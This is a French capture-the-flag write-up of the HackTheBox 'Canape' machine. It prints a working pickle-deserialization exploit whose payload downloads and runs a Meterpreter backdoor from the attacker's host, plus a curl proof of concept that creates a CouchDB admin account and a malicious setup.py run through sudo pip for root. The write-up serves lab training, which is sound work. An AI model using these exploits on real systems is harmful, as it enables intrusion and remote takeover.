# Solution du CTF Canape de HackTheBox

Mmmh un doonut !
----------------

Le CTF *Canape* de *HackTheBox* a été très intéressant dans le sens où il a permis de croiser de nouvelles technos mais le bonheur a été un peu gâché par le temps gaspillé à chercher... une option dans une page. Doh !  

Bienvenue à Springfield
-----------------------

Voici le résultat (très allégé pour conserver l'utile) d'un scan Nmap avec l'option *--script safe* :  

```plain
Nmap scan report for 10.10.10.70
Not shown: 65533 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cakephp-version: Version of codebase: 1.1.x, 1.2.x
|_Version of icons: 1.2.x
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.70
|     
|     Path: http://10.10.10.70:80/quotes
|     Line number: 35
|     Comment: 
|         <!-- 
|                   c8a74a098a60aaea1af98945bd707a7eab0ff4b0 - temporarily hide check
|                   <li class="nav-item">
|                     <a class="nav-link" href="/check">Check Submission</a>
|                   </li>
|                   -->
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
| http-headers: 
|   Date: Wed, 22 Aug 2018 15:48:03 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Content-Length: 3076
|   Connection: close
|   Content-Type: text/html; charset=utf-8
|   
|_  (Request type: HEAD)
|_http-security-headers: 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
| ssh2-enum-algos: 
|   kex_algorithms: (6)
|   server_host_key_algorithms: (5)
|   encryption_algorithms: (6)
|   mac_algorithms: (10)
|_  compression_algorithms: (2)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.2 - 4.9 (92%), Linux 4.8 (92%), Linux 4.9 (91%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap a fait un peu de crawling et on remarque un hash dans les commentaires de la page qui pourrait bien être une référence à du versioning, surtout qu'un dossier *.git* est présent à la base du site.  

Autant dire qu'à ce stade dy CTF on sait où on va :)   

Pour le reste le site web présent est un fan site des Simpsons qui collecte les citations de la série. Il est notamment possible de soumettre soit même des citations. On note tout de même un message indiquant que le site est *CouchDB* powered.  

Ni une ni deux on récupère le dépôt Git à l'aide de [dvcs-ripper](https://github.com/kost/dvcs-ripper) :  

```plain
perl rip-git.pl -v -u http://10.10.10.70:80/.git/
```

Une fois le dépôt dumpé on trouve du code Python/Flask dans le fichier *\_\_init\_\_.py* :  

```python
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5

app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
        return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
                outfile.write(char + quote)
                outfile.close()
                success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

Ce qui saute aux yeux c'est l'utilisation de cPickle pour dé-sérialiser des données via *cPickle.loads*. En effet ces données étant sous notre contrôle (via soumission web) on peut les formater pour provoquer une exécution de commande distante (RCE).  

On trouve des projets tout fait pour générer des payloads prêts à l'emploi comme [evilPick](https://github.com/francescolacerenza/evilPick) et [evil-pickle](https://github.com/fhightower/evil-pickle) (je me suis tourné vers le premier).  

Cet outil demande qu'on lui passe un script Python qui sera ainsi sérialisé. A titre d'exemple la transformation de l'instruction *print("hello world")* génère le pickle suivant :  

```plain
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAAAAAAAAQAAAEMAAABzCQAAAGQBAEdIZAAAUygCAAAATnMLAAAAaGVsbG8gd29ybGQoAAAAACgAAAAAKAAAAAAoAAAAAHMIAAAAPHN0cmluZz50AwAAAGZvbwEAAABzAgAAAAAB'
tRtRc__builtin__
globals
(tRS''
tR(tR.
```

Mais la soumission directe de ce pickle ne permettra pas d'exploiter la vulnérabilité pour autant.  

Le script Flask a en effet deux vérifications qui nécessitent d'être bypassées.  

Premièrement dans la méthode *submit()* le nom du personnage des *Simpsons* et sa citation sont récupérées. Le nom du personnage doit être valide et est vérifié parmi une whitelist via un simple *IN* insensible à la casse.  

Deuxièmement dans la méthode *check()* qui charge le contenu pour le désérialiser, le script vérifie d'abord la présence de la chaîne *p1*.  

Il semble compliqué (mais probablement pas impossible) d'intégrer des données dans la partie pickle puisque *evilPick* encode la totalité du script qu'on lui donne en base64...  

J'ai donc choisi la méthode qui consiste à faire en sorte que les mots clés attendus se trouvent dans le base64. On pourrait utiliser la force brute pour trouver des correspondances mais par tâtonnement ça fonctionne aussi.  

Ainsi *i3(y* donne *aTMoeQ==* en base64 qui contient Moe (le gérant du bar du même nom) et *iZua* donne *aVp1YQ==* qui contient le *p1*.  

Il est important de répéter ces patterns avec un padding pour être sûr que les chaînes souhaitées apparaissent quelque soit le reste du script.  

Mon exploit final (avec le payload intégré) ressemble alors à ceci :  

```python
import os

from hashlib import md5
import requests

ipv4 = os.popen("ip addr show tun0").read().split("inet ")[1].split("/")[0]
print("Generating down-exec payload with IP", ipv4)
payload = """import os
import urllib
print('pi3(ypi3(ypi3(ypi3(yiZuaiZuaiZuaiZu')
urllib.urlretrieve("http://{}/devloop_meterpreter", "/tmp/devloop_meterpreter")
os.system("chmod 777 /tmp/devloop_meterpreter;/tmp/devloop_meterpreter &")
""".format(ipv4)

with open("download_execute.py", "w") as fd:
    fd.write(payload)

print("Converting to pickle file...")
os.system("python evilPick.py -f download_execute.py -s payload -e none")

print("Sending payload...")
with open("payload") as fd:
    payload = fd.read()
    character, quote = payload.split("Moe", 1)
    character += "Moe"
    print("Character is")
    print(character)
    print("Quote is")
    print(quote)
    response = requests.post(
        "http://canape.htb/submit",
        data={
            "character": character,
            "quote": quote
        }
    )
    if "Success!" in response.text:
        print("Injection succeed!")
    else:
        print("Injection failed :(")
        exit()

    digest = md5(payload.encode()).hexdigest()
    print("Executing payload. Digest is {}...".format(digest))
    response = requests.post("http://canape.htb/check", data={"id": digest})
    print(response.status_code)
```

On aura préalablement généré une backdoor via *msfvenom* (lors de la première exploitation ça a fonctionné sans problème avec un *linux/x64/meterpreter/reverse\_tcp* mais lors de l'écriture de l'article il a fallut sortir un *linux/x64/meterpreter\_reverse\_https*...)  

On obtient alors un shell en tant que *www-data*. Le module *exploit\_suggester* de Metasploit nous remonte un exploit potentiel mais ça s'avère être un faux positif :  

```plain
[*] 10.10.10.70 - Collecting local exploits for x64/linux...
[*] 10.10.10.70 - 20 exploit checks are being tried...
[+] 10.10.10.70 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[*] Post module execution completed
```

Ouh Pinaise !
-------------

A ce stade on s'intéresse particulièrement à l'utilisateur *homer* dont le dossier personnel doit contenir notre flag de milieu de parcours.  

C'est un utilisateur avec un uid standard qui ne fait parti d'aucun groupe particulier (*uid=1000(homer) gid=1000(homer) groups=1000(homer)*)  

Si on cherche ses fichiers sur le système on voit qu'il possède tout */var/www/html* ainsi que le fichier */var/log/couchdb*.  

Et pour cause on voit dans les process qu'il fait tourner *CouchDB* ainsi que d'autres process *Erlang* :  

```plain
homer       668  0.8  3.5 651424 35336 ?        Sl   04:32   0:23 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
homer       679  0.0  0.0  26304   228 ?        S    04:32   0:00 /home/homer/bin/../erts-7.3/bin/epmd -daemon
homer       786  0.0  0.0   4504   736 ?        Ss   04:32   0:00 sh -s disksup
homer       790  0.0  0.0   4224   652 ?        Ss   04:32   0:00 /home/homer/bin/../lib/os_mon-2.4/priv/bin/memsup
homer       791  0.0  0.0   4356   656 ?        Ss   04:32   0:00 /home/homer/bin/../lib/os_mon-2.4/priv/bin/cpu_sup
homer      3591  0.0  0.8  44788  8040 ?        Ssl  04:57   0:00 ./bin/couchjs ./share/server/main.js
```

Vu que l'on ne voit rien d'autre côté disque on jette un œil au *CouchDB* qui écoute en local. On peut commencer [par cette documentation sur 1and1](https://www.1and1.com/cloud-community/learn/database/couchdb/working-with-couchdb-from-the-command-line/) pour avoir quelques commandes et infos sur ce système de base NoSQL.  

```plain
$ curl http://127.0.0.1:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
$ curl http://127.0.0.1:5984/_all_dbs
curl http://127.0.0.1:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
$ curl http://127.0.0.1:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}
```

Plutôt que de s’embêter avec curl on peut profiter de notre session Meterpreter pour forwarder le port en local :  

```plain
meterpreter > portfwd add -l 5984 -p 5984 -r 127.0.0.1
[*] Local TCP relay created: :5984 <-> 127.0.0.1:5984
```

Cela permet d'accéder à l'interface web *Fauxton* via l'adresse */\_utils* :  

![HTB Canape CouchDB Fauxton web interface](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/canape_fauxton.png)

Cette version de *CouchDB* est vulnérable [à un exploit](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html) permettant de créer un compte administrateur.  

 Pour faire court l'exploit consiste à spécifier deux fois la liste des rôles (équivalent des groupes) de l'utilisateur dans le JSON envoyé lors de la requête de création. Comme il s'agit d'un dictionnaire seul une clé roles ne doit être prise en compte. Malheureusement pour *CouchDB* la première occurrence est appliquée alors que c'est la seconde qui est vérifiée.  

On reprend le PoC curl pour créer notre compte privilégié :  

```plain
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:devloop' --data-binary '{"type": "user", "name": "devloop", "roles": ["_admin"], "roles": [], "password": "devloop31337"}'
```

On peut dès lors accéder aux bases dont l’accès nous été auparavant refusé :  

```plain
$ curl http://127.0.0.1:5984/_users/_all_docs --basic -u devloop:devloop31337
{"total_rows":7,"offset":0,"rows":[
{"id":"_design/_auth","key":"_design/_auth","value":{"rev":"1-75efcce1f083316d622d389f3f9813f7"}},
{"id":"org.couchdb.user:admin","key":"org.couchdb.user:admin","value":{"rev":"1-85c75449e4a18a89022cd324134fc943"}},
{"id":"org.couchdb.user:cmon","key":"org.couchdb.user:cmon","value":{"rev":"1-93fd3e66474bd9dc366f9992987084b3"}},
{"id":"org.couchdb.user:devloop","key":"org.couchdb.user:devloop","value":{"rev":"1-e2d60a59ff3e436ae8eb38d196f33618"}},
{"id":"org.couchdb.user:eheheh","key":"org.couchdb.user:eheheh","value":{"rev":"1-e529ced09093ca45635c9d99ac9a3e91"}},
{"id":"org.couchdb.user:oops","key":"org.couchdb.user:oops","value":{"rev":"1-db9d6cc939e7e3d1a2f41cf91ab32828"}},
{"id":"org.couchdb.user:wooyun","key":"org.couchdb.user:wooyun","value":{"rev":"1-0993e3551c110ed487f341883eb28732"}}
]}
```

La base *\_users* est une base interne mais pas la base *passwords* qui devrait contenir du contenu intéressant... Sauf qu'on ne voit que des métadonnées.  

J'ai passé 3 jours à essayer de comprendre ce que je faisais mal et à tenter d'exploiter en vain [une autre faille d'exécution de commande](https://www.exploit-db.com/exploits/44913/) qui aurait aussi pu toucher cette version sans résultats.  

Finalement j'ai vu dans les options de l'interface web cette option :  

![HTB Canape CouchDB data option](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/canape_couchdb_option.png)

Et j'ai maudit sur 7 générations les développeurs qui ont pensé cette interface (comme d'habitude ce sera la faute du frontend).  

Casse-toi Flanders !
--------------------

Une fois activée c'est mieux :')  

![HTB Canape Couchdb ssh password](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/canape_passwords.png)

```plain
  "item": "ssh",
  "password": "0B4jyA0xtytZi7esBNGp",
  "user": ""

  "item": "couchdb",
  "password": "r3lax0Nth3C0UCH",
  "user": "couchy"

  "item": "simpsonsfanclub.com",
  "password": "h02ddjdj2k2k2",
  "user": "homer"

  "user": "homerj0121",
  "item": "github",
  "password": "STOP STORING YOUR PASSWORDS HERE -Admin"
```

Essentiellement c'est juste le pass SSH qui nous intéresse et permet alors de récupérer le compte homer et (enfin) son flag (*bce918696f293e62b2321703bb27288d*).  

La suite est assez classique avec une entrée sudo à exploiter :  

```plain
homer@canape:~$ sudo -l
[sudo] password for homer:
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

[Une recherche rapide](https://groups.google.com/forum/#!msg/python-virtualenv/Z11FHJDYKEk/fnaQELGXCPoJ) nous indique que l'on peut spécifier un package local avec l'option -e qui doit correspondre à un dossier contenant un *setup.py*.  

Il suffit de créer un *setup.py* qui réutilise notre *Meterpreter* :  

```plain
homer@canape:~/.devloop$ cat mypackage/setup.py
import os
os.system("/tmp/devloop_meterpreter")
homer@canape:~/.devloop$ sudo pip install -e mypackage
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Obtaining file:///home/homer/.devloop/mypackage
No files/directories in /home/homer/.devloop/mypackage (from PKG-INFO)
```

Et pendant ce temps là à une demi-heure de route de chez *Léonard de Vinci* :  

```plain
msf exploit(multi/handler) > [*] Sending stage (816260 bytes) to 10.10.10.70
[*] Meterpreter session 4 opened (10.10.14.13:443 -> 10.10.10.70:34618) at 2018-08-27 14:45:20 +0200
msf exploit(multi/handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > shell
Process 4987 created.
Channel 1 created.
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt
928c3df1a12d7f67d2e8c2937120976d
```

Spider-cochon
-------------

Ce CTF me laisse un souvenir impérissable avec cette \*\*\*\*\*\* d'option de CouchDB :D  

Pour le reste c'était sympa d'exploiter les subtilités du script Flask :)

*Published September 15 2018 at 18:08*